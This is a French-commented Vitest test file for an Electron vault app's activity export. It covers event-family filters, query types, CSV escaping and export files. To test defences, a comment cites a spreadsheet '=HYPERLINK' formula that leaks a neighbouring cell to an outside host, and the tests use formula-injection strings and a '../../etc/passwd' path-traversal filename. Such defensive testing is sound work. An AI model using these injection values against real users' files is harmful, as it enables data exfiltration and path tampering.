/**
 * vaultActivityExport (F12) — les filtres du fil, et le fichier qu'on emporte.
 *
 * CE QUE CES TESTS GARDENT, ET POURQUOI CHACUN A COÛTÉ QUELQUE CHOSE :
 *
 *  · UN FILTRE NE DOIT JAMAIS RENDRE `types=` VIDE. Le worker répond 400
 *    `bad_request` sur une liste vide, et l'écran afficherait alors « impossible
 *    de lire » là où l'utilisateur croit avoir demandé quelque chose. Une
 *    sélection qui ne résout rien retombe sur ses familles, jamais sur le vide.
 *
 *  · UNE SÉLECTION QUI COUVRE TOUT NE S'ENVOIE PAS. Le paramètre absent est le
 *    fil complet ; l'envoyer quand même, c'est vingt paramètres liés de plus par
 *    requête pour exactement le même résultat.
 *
 *  · L'INJECTION DE FORMULE. Un fil de coffre contient des chaînes que des
 *    humains ont tapées (adresses, titres d'éléments). Ouvert dans un tableur,
 *    `=1+1` est une formule, et `=HYPERLINK("http://…"&A1)` exfiltre la ligne
 *    d'à côté au premier clic. Le préfixe `'` est le seul remède qui n'altère
 *    pas la valeur lue par un humain.
 *
 *  · LES IDENTIFIANTS OPAQUES SURVIVENT À LA RÉSOLUTION. L'adresse et le titre
 *    sont résolus SUR CET APPAREIL ; l'identifiant reste dans la colonne d'à
 *    côté, sans quoi deux exports faits sur deux postes ne se recoupent plus.
 *
 *   npx vitest run src/renderer/components/vaults/settings/__tests__/vaultActivityExport.vitest.ts
 */

import fs from 'node:fs';
import path from 'node:path';
import { describe, it, expect } from 'vitest';
import {
  ACTIVITY_EVENT_TYPES,
  ACTIVITY_FAMILY_IDS,
  activityFamily,
  activityQueryTypes,
  buildActivityExport,
  csvField,
  familyEventTypes,
  periodRange,
  type ActivityFamilyId,
} from '../vaultActivityExport';
import type { VaultActivityEventDTO } from '../../../../../services/vault/vaultApi';
import { EXPORT_PATH_REFUSED, isWriteRawFilePathRefusal } from '../saveExportFile';
import { vaultErrorKey } from '../../../../../services/vault/vaultErrorMessages';

const evt = (
  over: Partial<VaultActivityEventDTO> & Pick<VaultActivityEventDTO, 'id' | 'eventType'>
): VaultActivityEventDTO => ({
  actorUserId: null,
  targetId: null,
  occurredAt: 1_700_000_000_000,
  metadata: null,
  ...over,
});

describe('les familles', () => {
  it('range chaque type dans une seule famille — la même que la pastille du fil', () => {
    expect(activityFamily('member.item.update')).toBe('items');
    expect(activityFamily('member.item.purge')).toBe('items');
    expect(activityFamily('vault.rotate')).toBe('keys');
    expect(activityFamily('vault.settings.update')).toBe('keys');
    expect(activityFamily('member.invite')).toBe('members');
    expect(activityFamily('member.remove')).toBe('members');
    expect(activityFamily('role.change')).toBe('members');
  });

  /**
   * L'ALIGNEMENT SUR LE TÉLÉPHONE (`services/vaults/activityModel.activityFamily`).
   *
   * Vider la corbeille détruit des FICHIERS : ranger ce geste dans « coffre et
   * clés » par la seule vertu de son préfixe `vault.` le cachait à qui coche
   * « Éléments » — c'est-à-dire à qui cherche exactement cette ligne-là.
   */
  it('vider la corbeille est un geste sur des ÉLÉMENTS, pas sur le coffre', () => {
    expect(activityFamily('vault.trash.empty')).toBe('items');
  });

  it('purger le COFFRE reste « coffre et clés » — ce n’est pas une sélection d’éléments', () => {
    expect(activityFamily('vault.purge')).toBe('keys');
    expect(activityFamily('vault.delete')).toBe('keys');
  });

  /**
   * REPEINDRE N'EST PAS RENOMMER — mais ça reste un geste SUR LE COFFRE.
   * (`CHANGES-2026-09.md`, §2 : nouveau type `vault.appearance`.)
   */
  it('changer l’apparence est « coffre et clés », et le filtre peut le demander', () => {
    expect(activityFamily('vault.appearance')).toBe('keys');
    expect(ACTIVITY_EVENT_TYPES).toContain('vault.appearance');
    expect(familyEventTypes('keys')).toContain('vault.appearance');
  });

  it('un type INCONNU retombe sur « coffre et clés », jamais sur « personnes »', () => {
    // Un inconnu vient d'un serveur plus récent. Rangé dans « personnes », il
    // se glisserait dans une liste de noms où il ne raconte rien de personne.
    expect(activityFamily('vault.something.new')).toBe('keys');
    expect(activityFamily('quelquechose.dinconnu')).toBe('keys');
  });

  it('la dérivation par famille SUIT la fonction — l’export ne peut pas diverger de l’écran', () => {
    expect(familyEventTypes('items')).toContain('vault.trash.empty');
    expect(familyEventTypes('keys')).not.toContain('vault.trash.empty');
    expect(familyEventTypes('keys')).toContain('vault.purge');
    // Ce que le serveur recevrait si l'on cochait « Éléments » seul.
    expect(activityQueryTypes({ families: ['items'], types: [] })).toContain('vault.trash.empty');
  });

  it('les trois familles PARTITIONNENT ce que la route sert — rien en double, rien dehors', () => {
    const vus = new Set<string>();
    for (const f of ACTIVITY_FAMILY_IDS) {
      for (const t of familyEventTypes(f)) {
        expect(vus.has(t)).toBe(false);
        vus.add(t);
        expect(activityFamily(t)).toBe(f);
      }
    }
    // member.remove est servi par la route (il cible la PERSONNE) : le filtre
    // doit pouvoir le demander, sinon il serait la seule ligne infiltrable.
    expect(vus.has('member.remove')).toBe(true);
    expect(vus.has('vault.create')).toBe(true);
  });
});

/**
 * LA TAXONOMIE EST CONFRONTÉE À SON AUTORITÉ, pas à un autre dérivé.
 *
 * `ACTIVITY_EVENT_TYPES` est une COPIE de `VAULT_FAMILY_EVENT_TYPES` (le
 * renderer ne peut pas importer `infra/`). Une copie qui dérive ne se voit
 * jamais : un type retiré côté serveur ferait répondre 400 `bad_request` au
 * fil ENTIER dès qu'on coche sa famille — l'écran dirait « impossible de lire »
 * à quelqu'un qui vient de cliquer un filtre. On lit donc le fichier du worker,
 * et on compare aux deux listes qu'il déclare.
 */
describe('la taxonomie, confrontée au worker', () => {
  it('liste EXACTEMENT ce que la route accepte, member.remove compris', () => {
    const src = fs.readFileSync(
      path.join(__dirname, '../../../../../../infra/cloudflare-worker/src/types.ts'),
      'utf8'
    );
    const bloc = src
      .split('export const VAULT_ACTIVITY_EVENT_TYPES = [')[1]
      .split('] as const;')[0];
    // `member.remove` n'est pas dans cette constante (il cible la PERSONNE) mais
    // la route l'accepte via `VAULT_FAMILY_EVENT_TYPES` — voir vaults.ts.
    const worker = new Set([...bloc.matchAll(/'([a-z_.]+)'/g)].map((m) => m[1]));
    worker.add('member.remove');
    expect(new Set(ACTIVITY_EVENT_TYPES)).toEqual(worker);
  });
});

describe('les types envoyés au serveur', () => {
  it('aucune famille, aucun type = le fil entier, et donc AUCUN paramètre', () => {
    expect(activityQueryTypes({ families: [], types: [] })).toBeNull();
  });

  it('les trois familles cochées valent « tout » : on n’envoie toujours rien', () => {
    expect(activityQueryTypes({ families: [...ACTIVITY_FAMILY_IDS], types: [] })).toBeNull();
  });

  it('une famille = ses types, et rien d’autre', () => {
    const types = activityQueryTypes({ families: ['keys'], types: [] });
    expect(types).not.toBeNull();
    expect(new Set(types as string[])).toEqual(new Set(familyEventTypes('keys')));
  });

  it('des types explicites l’emportent, réduits aux familles cochées', () => {
    const types = activityQueryTypes({
      families: ['members'],
      types: ['member.join', 'vault.rotate'],
    });
    expect(types).toEqual(['member.join']);
  });

  it('une sélection de types DEVENUE vide retombe sur les familles — jamais sur `types=` vide (400)', () => {
    const types = activityQueryTypes({ families: ['items'], types: ['member.join'] });
    expect(types).not.toBeNull();
    expect((types as string[]).length).toBeGreaterThan(0);
    expect(new Set(types as string[])).toEqual(new Set(familyEventTypes('items')));
  });

  it('ne rend jamais de doublon (le worker plafonne les paramètres liés)', () => {
    const types = activityQueryTypes({
      families: ['members'],
      types: ['member.join', 'member.join'],
    });
    expect(types).toEqual(['member.join']);
  });

  it('un type inconnu est IGNORÉ plutôt qu’envoyé (le worker répondrait 400)', () => {
    const types = activityQueryTypes({ families: [], types: ['member.join', 'pas.un.type'] });
    expect(types).toEqual(['member.join']);
  });
});

describe('les périodes', () => {
  const now = 1_700_000_000_000;

  it('« tout » n’a pas de borne', () => {
    expect(periodRange('all', now)).toEqual({});
  });

  it('7 / 30 / 90 jours bornent le PASSÉ seulement — le futur n’existe pas', () => {
    expect(periodRange('7d', now)).toEqual({ since: now - 7 * 86_400_000 });
    expect(periodRange('30d', now)).toEqual({ since: now - 30 * 86_400_000 });
    expect(periodRange('90d', now)).toEqual({ since: now - 90 * 86_400_000 });
  });
});

describe('l’échappement CSV', () => {
  it('préfixe les quatre amorces de formule', () => {
    expect(csvField('=1+1')).toBe("'=1+1");
    expect(csvField('+33 6 00 00 00 00')).toBe("'+33 6 00 00 00 00");
    expect(csvField('-note')).toBe("'-note");
    expect(csvField('@canal')).toBe("'@canal");
  });

  it('préfixe aussi la tabulation et le retour chariot, que les tableurs mangent', () => {
    // La tabulation n'oblige à aucun guillemet (RFC 4180) : juste le préfixe.
    expect(csvField('\tcaché')).toBe("'" + '\tcaché');
    // Le retour chariot, lui, casserait la ligne : préfixe ET guillemets.
    expect(csvField('\rcaché')).toBe('"' + "'" + '\rcaché' + '"');
  });

  it('protège la formule ET la met entre guillemets quand elle contient une virgule', () => {
    expect(csvField('=HYPERLINK("http://x","a"),b')).toBe('"\'=HYPERLINK(""http://x"",""a""),b"');
  });

  it('laisse un texte ordinaire intact, et double les guillemets qu’il contient', () => {
    expect(csvField('rapport.pdf')).toBe('rapport.pdf');
    expect(csvField('il a dit "non"')).toBe('"il a dit ""non"""');
  });

  it('un nombre reste un NOMBRE — sinon la colonne « époque » cesse de se trier', () => {
    expect(csvField(3)).toBe('3');
    expect(csvField(-2)).toBe('-2');
  });

  it('rien du tout rend une cellule vide, jamais « null »', () => {
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
  });
});

describe('le fichier exporté', () => {
  const base = {
    vaultId: 'v-1',
    vaultName: 'Dossier client',
    generatedAt: Date.UTC(2026, 7, 29, 10, 0, 0),
    period: { since: Date.UTC(2026, 6, 30) },
    filters: { families: [] as ActivityFamilyId[], types: [] as string[], actor: null },
    events: [
      evt({
        id: 12,
        eventType: 'member.item.update',
        actorUserId: 'u-1',
        occurredAt: Date.UTC(2026, 7, 28, 9, 30),
        metadata: { item_id: 'i-1', kind: 'content' },
      }),
      evt({
        id: 11,
        eventType: 'member.invite',
        actorUserId: 'u-2',
        occurredAt: Date.UTC(2026, 7, 27, 8, 0),
        metadata: { role: 'member', invite_id: 'inv-9' },
      }),
    ],
    emailByUserId: new Map([['u-1', 'ada@example.com']]),
    nameByItemId: new Map([['i-1', '=rapport.pdf']]),
    recorded: true,
    truncated: false,
  };

  it('CSV : une ligne par événement, l’adresse ET l’identifiant, le titre ÉCHAPPÉ', () => {
    const f = buildActivityExport({ ...base, format: 'csv' });
    expect(f.mime).toBe('text/csv;charset=utf-8');
    expect(f.filename).toBe('filarr-activite-dossier-client-2026-08-29.csv');
    // La marque d'ordre d'octets : sans elle, un tableur lit les accents en latin-1.
    expect(f.content.startsWith('﻿')).toBe(true);
    expect(f.content).toContain('ada@example.com');
    // L'identifiant opaque survit à la résolution.
    expect(f.content).toContain('u-1');
    // Le titre commence par « = » : il est neutralisé, pas supprimé.
    expect(f.content).toContain("'=rapport.pdf");
    // L'acteur non résolu ne devient pas « undefined » : la colonne reste vide.
    const lignes = f.content.split('\r\n');
    const ligneInvite = lignes.find((l) => l.includes('member.invite'));
    expect(ligneInvite).toBeDefined();
    expect(ligneInvite).not.toContain('undefined');
    expect(ligneInvite).toContain('u-2');
  });

  it('CSV : les lignes finissent en CRLF (RFC 4180)', () => {
    const f = buildActivityExport({ ...base, format: 'csv' });
    expect(f.content).toContain('\r\n');
    expect(f.content.includes('\n\n')).toBe(false);
  });

  it('JSON : la même matière, avec un schéma nommé et les deux formes de chaque nom', () => {
    const f = buildActivityExport({ ...base, format: 'json' });
    expect(f.mime).toBe('application/json;charset=utf-8');
    const doc = JSON.parse(f.content);
    expect(doc.schema).toBe('filarr.vault-activity/1');
    expect(doc.vault.id).toBe('v-1');
    expect(doc.events).toHaveLength(2);
    expect(doc.events[0].actorUserId).toBe('u-1');
    expect(doc.events[0].actorEmail).toBe('ada@example.com');
    expect(doc.events[0].itemId).toBe('i-1');
    expect(doc.events[0].itemName).toBe('=rapport.pdf');
    // Aucun échappement de tableur en JSON : ce serait corrompre la donnée.
    expect(f.content).not.toContain("'=rapport.pdf");
    expect(doc.events[1].actorEmail).toBeNull();
  });

  it('dit qu’il est TRONQUÉ plutôt que de laisser croire à un fil complet', () => {
    const csv = buildActivityExport({ ...base, format: 'csv', truncated: true });
    expect(csv.content.toLowerCase()).toContain('truncated');
    const json = JSON.parse(
      buildActivityExport({ ...base, format: 'json', truncated: true }).content
    );
    expect(json.truncated).toBe(true);
  });

  it('dit que l’offre ne journalise PAS, au lieu de rendre un fichier vide muet', () => {
    const json = JSON.parse(
      buildActivityExport({ ...base, format: 'json', recorded: false, events: [] }).content
    );
    expect(json.recorded).toBe(false);
    expect(json.events).toEqual([]);
  });

  it('n’ajoute la confiance et les époques QUE si on les a demandées', () => {
    const sans = JSON.parse(buildActivityExport({ ...base, format: 'json' }).content);
    expect(sans.trust).toBeUndefined();
    expect(sans.keyEpochs).toBeUndefined();

    const avec = JSON.parse(
      buildActivityExport({
        ...base,
        format: 'json',
        trust: [
          { userId: 'u-1', state: 'verified', reason: 'verified_out_of_band', verifiedAt: 1 },
        ],
        epochs: {
          currentEpoch: 3,
          members: [{ userId: 'u-1', wrappedEpoch: 3 }, { userId: 'u-2' }],
        },
      }).content
    );
    expect(avec.trust).toHaveLength(1);
    expect(avec.trust[0].email).toBe('ada@example.com');
    expect(avec.keyEpochs.currentEpoch).toBe(3);
    // « on ne sait pas » a sa propre colonne : jamais rangé avec « à jour ».
    const parId = Object.fromEntries(
      avec.keyEpochs.members.map((m: { userId: string; status: string }) => [m.userId, m.status])
    );
    expect(parId['u-1']).toBe('up_to_date');
    expect(parId['u-2']).toBe('unknown');
  });

  it('CSV : les sections optionnelles portent leur propre en-tête de colonnes', () => {
    const f = buildActivityExport({
      ...base,
      format: 'csv',
      trust: [{ userId: 'u-1', state: 'verified', reason: 'verified_out_of_band', verifiedAt: 1 }],
      epochs: { currentEpoch: 3, members: [{ userId: 'u-2' }] },
    });
    expect(f.content).toContain('Trust state');
    expect(f.content).toContain('Sealed epoch');
    expect(f.content).toContain('unknown');
  });

  it('un nom de coffre exotique ne fabrique PAS un chemin dans le nom de fichier', () => {
    const f = buildActivityExport({ ...base, format: 'csv', vaultName: '../../etc/passwd' });
    expect(f.filename).not.toContain('/');
    expect(f.filename).not.toContain('..');
    const vide = buildActivityExport({ ...base, format: 'json', vaultName: '☂☂☂' });
    expect(vide.filename).toBe('filarr-activite-2026-08-29.json');
  });
});

/**
 * OÙ LE FICHIER A LE DROIT D'ATTERRIR (F12).
 *
 * Le processus principal borne `writeRawFile` au dossier personnel et au
 * temporaire — une garde de sécurité, pas un détail d'implémentation. Choisir
 * `D:\` ou un lecteur réseau dans la boîte système faisait donc échouer l'export
 * sur la phrase générique « l'export a échoué », qui envoie chercher une panne
 * là où il n'y en a pas : le geste était refusé, et pour une raison qu'on
 * connaît. On reconnaît ce refus-là pour le NOMMER.
 *
 * Le libellé vient du processus principal (`electron/main.ts`, canal
 * `writeRawFile`) et n'est pas traduit : c'est pourquoi il se reconnaît au
 * texte. Le nom du canal en fait partie — sans lui, n'importe quel message
 * parlant de « home » serait pris pour ce refus.
 */
describe('saveExportFile : un chemin refusé se dit', () => {
  it('reconnaît le refus du processus principal, tel qu’Electron l’emballe', () => {
    expect(
      isWriteRawFilePathRefusal(
        "Error invoking remote method 'writeRawFile': Error: writeRawFile: path must be under user home or temp directory"
      )
    ).toBe(true);
  });

  it('ne prend PAS une autre panne d’écriture pour un refus de chemin', () => {
    expect(isWriteRawFilePathRefusal('EACCES: permission denied')).toBe(false);
    expect(isWriteRawFilePathRefusal('ENOSPC: no space left on device')).toBe(false);
    expect(isWriteRawFilePathRefusal('')).toBe(false);
    // Le nom du canal seul ne suffit pas : c'est le refus de CHEMIN qu'on nomme.
    expect(isWriteRawFilePathRefusal('writeRawFile: disk is full')).toBe(false);
  });

  it('le code qu’il lève porte une phrase à lui, pas le repli générique', () => {
    expect(vaultErrorKey(EXPORT_PATH_REFUSED, 'teamVaults.activity.export.failed')).not.toBe(
      'teamVaults.activity.export.failed'
    );
  });
});
